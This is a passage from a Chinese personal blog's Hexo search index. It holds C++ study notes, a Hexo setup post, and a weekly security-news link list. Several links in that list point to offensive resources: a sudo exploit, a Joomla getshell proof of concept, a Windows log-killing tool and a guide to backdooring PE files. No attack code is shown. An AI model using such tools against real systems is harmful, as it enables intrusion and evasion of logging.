rel="noopener">https://msdn.microsoft.com/zh-cn/library/dn707591.aspx</a><br><a href="https://program-think.blogspot.com/2009/01/cxx-cross-platform-develop-0-overview.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2009/01/cxx-cross-platform-develop-0-overview.html</a></li><li>google c++ 编程规范<br><a href="http://google.github.io/styleguide/cppguide.html" target="_blank" rel="noopener">http://google.github.io/styleguide/cppguide.html</a></li><li><p>预编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">预编译又称为预处理，是做些代码文本的替换工作。</span><br><span class="line">处理#开头的指令，比如拷贝#include包含的文件代码，#define宏定义的替换,条件编译等</span><br><span class="line">就是为编译做的预备工作的阶段</span><br><span class="line">主要处理#开始的预编译指令</span><br></pre></td></tr></table></figure></li><li><p>不同的编译器以及不同的语言标准<br><a href="https://www.wikiwand.com/zh-hans/GCC" target="_blank" rel="noopener">gcc wiki</a><br>gnu c compiler，因为它原本只能处理C语言。GCC很快地扩展，变得可处理C++。之后也变得可处理Fortran、Pascal、Objective-C、Java、Ada，以及Go与其他语言。<br></p></li><li>使用g++ 编译的时候，可以使用c++的标准库，使用gcc命令编译的时候，可以使用c的标准库。<a href="https://stackoverflow.com/questions/172587/what-is-the-difference-between-g-and-gcc/172592#172592" target="_blank" rel="noopener">stackoverflow link</a></li><li>还有一个编译器不得不说，那就是clang，他一个C、C++、Objective-C和Objective-C++编程语言的编译器前端。他的出现目的是替代GCC，是在苹果公司的赞助支持下开发的。<br><br>测试证明Clang编译Objective-C代码时速度为GCC的3倍[4]，还能针对用户发生的编译错误准确地给出建议.</li><li>类类型与结构体类型相似，结构体类型也可以有函数成员，主要区别在于，类类型的默认访问权限是private，结构体类型的缺省访问权限是public。类的数据成员和函数成员分别描述该类实体的属性和行为。即这个实体有什么属性，它有什么样的行为。对象也是一种变量，是一种类类型的变量。对于已声明的类，可以使用它来定义变量。在建立对象时，只为对象分配用于保存数据成员的内存空间，而类中定义的成员函数的代码被放在计算机内存的一个公共区中，并供该类的所有对象共享，这是c++实现对象的一种方法。逻辑上，仍将每一个对象理解为由独立的数据成员和各自的成员函数组成。</li><li>结构体指针 struct stu *pstu = &stu1; </li><li>：：在c++中是作用域符号。</li><li>c和c++ 不同的标准<br><img src="/2017/06/12/c-易混淆点笔记/cpStandard.png" alt=""><br><img src="/2017/06/12/c-易混淆点笔记/cStandard.png" alt=""><br>可见，c++的标准有c++98，c++11,c++14,c++17,c++后面对应的数字是年份的意思<br><br>c语言的标准有c90，c99，以及c11，可见最新的c标准是c11.<br>关于他们之前的差异。<br><br><a href="https://www.wikiwand.com/en/C11_(C_standard_revision" target="_blank" rel="noopener">关于c11和c99的区别</a>)<br><a href="https://www.wikiwand.com/zh-hans/C%2B%2B14" target="_blank" rel="noopener">关于c++各个版本之前的区别</a><br><a href="https://www.gitbook.com/book/changkun/cpp1x-tutorial/details" target="_blank" rel="noopener">高速上手 C++ 11/14</a><br><a href="http://www.cnblogs.com/zhwl/archive/2012/04/19/2456565.html" target="_blank" rel="noopener">vc6.0与标准C++</a><br><a href="https://isocpp.org/" target="_blank" rel="noopener">ISO cpp</a></li><li>c++ 第三方库<br><a href="https://github.com/boostorg/boost" target="_blank" rel="noopener">c++准标准库boost</a><br><a href="https://abseil.io/" target="_blank" rel="noopener">google 的c++基础库 abseil</a></li><li>多线程c程序<br><a href="https://msdn.microsoft.com/zh-cn/library/esszf9hw.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/esszf9hw.aspx</a><br><a href="http://zh.highscore.de/cpp/boost/multithreading.html" target="_blank" rel="noopener">http://zh.highscore.de/cpp/boost/multithreading.html</a></li><li>c语言的json操作库<br><a href="https://github.com/akheron/jansson" target="_blank" rel="noopener">https://github.com/akheron/jansson</a><br><a href="http://zenol.fr/blog/boost-property-tree/en.html" target="_blank" rel="noopener">使用boost操作json</a></li><li>c/c++ 内存泄露及检测<br><a href="http://www.cnblogs.com/skynet/archive/2011/02/20/1959162.html" target="_blank" rel="noopener">http://www.cnblogs.com/skynet/archive/2011/02/20/1959162.html</a></li><li>const关键字的使用方法<br><a href="http://www.cnblogs.com/jiabei521/p/3335676.html" target="_blank" rel="noopener">http://www.cnblogs.com/jiabei521/p/3335676.html</a></li><li><p>关于msvc的介绍<br><a href="https://www.wikiwand.com/zh-hans/Microsoft_Visual_C%2B%2B" target="_blank" rel="noopener">https://www.wikiwand.com/zh-hans/Microsoft_Visual_C%2B%2B</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MSVC++ 14.1 _MSC_VER == 1911 (Visual Studio 2017)</span><br><span class="line">MSVC++ 14.1 _MSC_VER == 1910 (Visual Studio 2017)</span><br><span class="line">MSVC++ 14.0 _MSC_VER == 1900 (Visual Studio 2015)</span><br><span class="line">MSVC++ 12.0 _MSC_VER == 1800 (Visual Studio 2013)</span><br><span class="line">MSVC++ 11.0 _MSC_VER == 1700 (Visual Studio 2012)</span><br><span class="line">MSVC++ 10.0 _MSC_VER == 1600 (Visual Studio 2010)</span><br><span class="line">MSVC++ 9.0  _MSC_FULL_VER == 150030729 (Visual Studio 2008, SP1)</span><br><span class="line">MSVC++ 9.0  _MSC_VER == 1500 (Visual Studio 2008)</span><br><span class="line">MSVC++ 8.0  _MSC_VER == 1400 (Visual Studio 2005)</span><br><span class="line">MSVC++ 7.1  _MSC_VER == 1310 (Visual Studio 2003)</span><br><span class="line">MSVC++ 7.0  _MSC_VER == 1300</span><br><span class="line">MSVC++ 6.0  _MSC_VER == 1200</span><br><span class="line">MSVC++ 5.0  _MSC_VER == 1100</span><br><span class="line"></span><br><span class="line">打印版本 msvc</span><br><span class="line">#ifdef _MSC_VER</span><br><span class="line">cout &lt;&lt; _MSC_VER &lt;&lt; endl;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></li><li><p>VS的调试技巧<br><a href="https://blogs.msdn.microsoft.com/c/2016/09/19/visual-studio-c%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7%E5%92%8C%E7%AA%8D%E9%97%A8/" target="_blank" rel="noopener">https://blogs.msdn.microsoft.com/c/2016/09/19/visual-studio-c%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7%E5%92%8C%E7%AA%8D%E9%97%A8/</a></p></li><li>检测变量类型的方法 typeinfo 头<br><a href="http://www.cplusplus.com/forum/general/21246/" target="_blank" rel="noopener">http://www.cplusplus.com/forum/general/21246/</a><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li><li>相对于其它脚本语言python、php啥的，c++的语法稍有些复杂，尤其是在windows下进行c++开发的时候，一开始一大堆的宏定义就小白们搞懵了。如果要写c++入门建议还是学linux下的c++，等学差不多了，再切换windows相对来说就容易一些了。</li><li>c++较写脚本语言开发感觉还是会慢一点，脚本语言不用编译，c++每次修改一点儿，都要重新编译和链接，而且工程越大，时间就越长。</li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>每周安全动态</title>
      <link href="/2017/06/04/%E6%AF%8F%E5%91%A8%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
      <url>/2017/06/04/%E6%AF%8F%E5%91%A8%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/</url>
      <content type="html"><![CDATA[<h1 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h1><ul><li>Google 引入定制的机器学习技术检测 Gmail 中的钓鱼邮件 <a href="https://threatpost.com/new-machine-learning-behind-early-phishing-detection-in-gmail/125976/" target="_blank" rel="noopener">https://threatpost.com/new-machine-learning-behind-early-phishing-detection-in-gmail/125976/</a></li><li>Ganxo - 开源 API Hook 框架 <a href="https://github.com/PassingTheKnowledge/Ganxo" target="_blank" rel="noopener">https://github.com/PassingTheKnowledge/Ganxo</a></li><li>HTTPS 原理浅析及其在 Android 中的使用 <a href="http://mobile.51cto.com/android-540662.htm" target="_blank" rel="noopener">http://mobile.51cto.com/android-540662.htm</a></li><li>初见 Chrome Headless Browser <a href="https://lightless.me/archives/first-glance-at-chrome-headless-browser.html" target="_blank" rel="noopener">https://lightless.me/archives/first-glance-at-chrome-headless-browser.html</a></li><li>EternalPot - 搭建全球性的SMB漏洞蜜罐基础设施的经验 <a href="https://doublepulsar.com/eternalpot-lessons-from-building-a-global-nation-state-smb-exploit-honeypot-infrastructure-3f2a0b064ffe" target="_blank" rel="noopener">https://doublepulsar.com/eternalpot-lessons-from-building-a-global-nation-state-smb-exploit-honeypot-infrastructure-3f2a0b064ffe</a></li><li>来自内部员工的威胁以及如何防御，来自 NCC Group 的 Paper  <a href="https://www.nccgroup.trust/uk/our-research/understanding-the-insider-threat-and-how-to-mitigate-it/" target="_blank" rel="noopener">https://www.nccgroup.trust/uk/our-research/understanding-the-insider-threat-and-how-to-mitigate-it/</a>  </li><li>Cheat Sheet of Machine Learning and Python (and Math) Cheat Sheets <a href="https://unsupervisedmethods.com/cheat-sheet-of-machine-learning-and-python-and-math-cheat-sheets-a4afe4e791b6" target="_blank" rel="noopener">https://unsupervisedmethods.com/cheat-sheet-of-machine-learning-and-python-and-math-cheat-sheets-a4afe4e791b6</a></li><li>Package 钓鱼 <a href="http://blog.fatezero.org/2017/06/01/package-fishing/" target="_blank" rel="noopener">http://blog.fatezero.org/2017/06/01/package-fishing/</a></li><li>Invoke-Phant0m Windows日志杀手 <a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">https://github.com/hlldz/Invoke-Phant0m</a></li><li>如何在PE文件中手动植入一个后门 <a href="http://bobao.360.cn/learning/detail/3931.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3931.html</a></li><li>渗透标准思维导图 <a href="https://www.processon.com/view/583e8834e4b08e31357bb727" target="_blank" rel="noopener">https://www.processon.com/view/583e8834e4b08e31357bb727</a></li><li>从蜜罐数据到SSH蜜罐的典型攻击分析 <a href="http://bobao.360.cn/learning/detail/3929.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3929.html</a></li><li>Joomla Core 3.x后台getshell <a href="https://howucan.gr/vulnerabilities/joomla-exploits/2215-joomla-core-3-x-poc-vulnerability-shell-upload" target="_blank" rel="noopener">https://howucan.gr/vulnerabilities/joomla-exploits/2215-joomla-core-3-x-poc-vulnerability-shell-upload</a></li><li>sudo-CVE-2017-1000367漏洞利用程序 <a href="https://github.com/c0d3z3r0/sudo-CVE-2017-1000367" target="_blank" rel="noopener">https://github.com/c0d3z3r0/sudo-CVE-2017-1000367</a></li><li>一键自动化域渗透工具 <a href="https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html</a></li><li>在OSX上监听单个应用HTTPS流量 <a href="https://calebfenton.github.io/2017/05/27/monitoring-https-of-a-single-app-on-osx/" target="_blank" rel="noopener">https://calebfenton.github.io/2017/05/27/monitoring-https-of-a-single-app-on-osx/</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>hello-world</title>
      <link href="/2017/04/28/hello-world/"/>
      <url>/2017/04/28/hello-world/</url>
      <content type="html"><![CDATA[<h3 id="旧的博客-博客园可能以后不会再更新-旧博客地址：http-www-cnblogs-com-mrchang"><a href="#旧的博客-博客园可能以后不会再更新-旧博客地址：http-www-cnblogs-com-mrchang" class="headerlink" title="旧的博客 博客园可能以后不会再更新 旧博客地址：http://www.cnblogs.com/mrchang/"></a>旧的博客 博客园可能以后不会再更新 旧博客地址：<a href="http://www.cnblogs.com/mrchang/" target="_blank" rel="noopener">http://www.cnblogs.com/mrchang/</a></h3><h3 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world ~"></a>hello world ~</h3><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p><h3 id="新的博客搭建可参考"><a href="#新的博客搭建可参考" class="headerlink" title="新的博客搭建可参考"></a>新的博客搭建可参考</h3><p><a href="http://gonghonglou.com/2016/02/03/firstblog/" target="_blank" rel="noopener">http://gonghonglou.com/2016/02/03/firstblog/</a><br><a href="http://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/" target="_blank" rel="noopener">http://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</a><br><del>hexo的分享功能中大部分插件不支持https这很蛋疼，有时间再折腾。</del><br>更新：已通过<br><a href="https://brightloong.github.io/2017/02/26/Hexo-Github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2-%E4%B8%89-%E2%80%94%E2%80%94%E7%99%BE%E5%BA%A6%E5%88%86%E4%BA%AB%E9%9B%86%E6%88%90/" target="_blank" rel="noopener">https://brightloong.github.io/2017/02/26/Hexo-Github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2-%E4%B8%89-%E2%80%94%E2%80%94%E7%99%BE%E5%BA%A6%E5%88%86%E4%BA%AB%E9%9B%86%E6%88%90/</a><br>添加文章阅读量<br><a href="http://www.jeyzhang.com/hexo-next-add-post-views.html" target="_blank" rel="noopener">http://www.jeyzhang.com/hexo-next-add-post-views.html</a><br>阅读量bug<br><a href="https://leaferx.online/2018/02/11/lc-security/" target="_blank" rel="noopener">https://leaferx.online/2018/02/11/lc-security/</a><br>添加了分享和评论功能<br><a href="http://www.jianshu.com/p/276d10de413e" target="_blank" rel="noopener">http://www.jianshu.com/p/276d10de413e</a><br><a href="http://theme-next.iissnan.com/third-party-services.html" target="_blank" rel="noopener">http://theme-next.iissnan.com/third-party-services.html</a><br>hexo 右边侧栏默认展示：</p><p>这里搭建此博客的目的主要记录一下日常工作和学习中看到的一些安全动态消息。</p><ul><li><p>添加一个网页背景效果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以在public/tags/index.html 中添加如下的代码</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; color=&quot;0,0,255&quot; opacity=&apos;0.7&apos; zIndex=&quot;-2&quot; count=&quot;99&quot; src=&quot;https://kevien.github.io/static/api/js/canvas-nest.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>Gitment：使用 GitHub Issues 搭建评论系统<br><a href="https://imsun.net/posts/gitment-introduction/" target="_blank" rel="noopener">https://imsun.net/posts/gitment-introduction/</a></p></li><li>Hexo 添加robots.txt<br><a href="http://larrynung.github.io/2016/07/18/Hexo-Setup-robots-txt/" target="_blank" rel="noopener">http://larrynung.github.io/2016/07/18/Hexo-Setup-robots-txt/</a></li><li>Hexo–Next主题优化<br><a href="https://blog.csdn.net/heqiangflytosky/article/details/54863185" target="_blank" rel="noopener">https://blog.csdn.net/heqiangflytosky/article/details/54863185</a></li><li>修改字体颜色<br><a href="https://github.com/iissnan/hexo-theme-next/issues/98" target="_blank" rel="noopener">https://github.com/iissnan/hexo-theme-next/issues/98</a></li><li>修改字体颜色<br>修改文件 post-title.styl</li><li>修改首页展示<br><a href="https://neveryu.github.io/2017/07/15/hexo-next-five/" target="_blank" rel="noopener">https://neveryu.github.io/2017/07/15/hexo-next-five/</a></li><li>站内搜索<br><a href="https://zty.js.org/post/2016/07/08/hexo-localsearch.html" target="_blank" rel="noopener">https://zty.js.org/post/2016/07/08/hexo-localsearch.html</a></li><li>优化hexo速度  hexo默认会加载google字体 导致整个网页加载很难 体验很差</li><li><a href="https://jpanj.com/2017/%E4%BC%98%E5%8C%96blog%E9%80%9F%E5%BA%A6/" target="_blank" rel="noopener">https://jpanj.com/2017/%E4%BC%98%E5%8C%96blog%E9%80%9F%E5%BA%A6/</a><h3 id="搭建完成后常用命令"><a href="#搭建完成后常用命令" class="headerlink" title="搭建完成后常用命令"></a>搭建完成后常用命令</h3><h4 id="发表一篇文章"><a href="#发表一篇文章" class="headerlink" title="发表一篇文章"></a>发表一篇文章</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="mac上使用可以使用mweb工具进行md文件编辑"><a href="#mac上使用可以使用mweb工具进行md文件编辑" class="headerlink" title="mac上使用可以使用mweb工具进行md文件编辑"></a>mac上使用可以使用mweb工具进行md文件编辑</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在/source/_posts 目录下面找到对应md文件编辑</span><br></pre></td></tr></table></figure><h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><p>hexo clean<br>hexo g <del>generate</del><br>hexo d <del>deploy</del></p><h4 id="ok了"><a href="#ok了" class="headerlink" title="ok了"></a>ok了</h4><h4 id="markdown-语法"><a href="#markdown-语法" class="headerlink" title="markdown 语法"></a>markdown 语法</h4><ol><li>加粗使用双下滑线</li><li>空格使用 &amp;nbsp分号</li><li>删除线  双波浪线  </li><li>添加超链接<br><a href="http://www.google.com/" target="_blank" rel="noopener">Google</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Google](http://www.google.com/)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
    </entry>
    
  
  
</search>
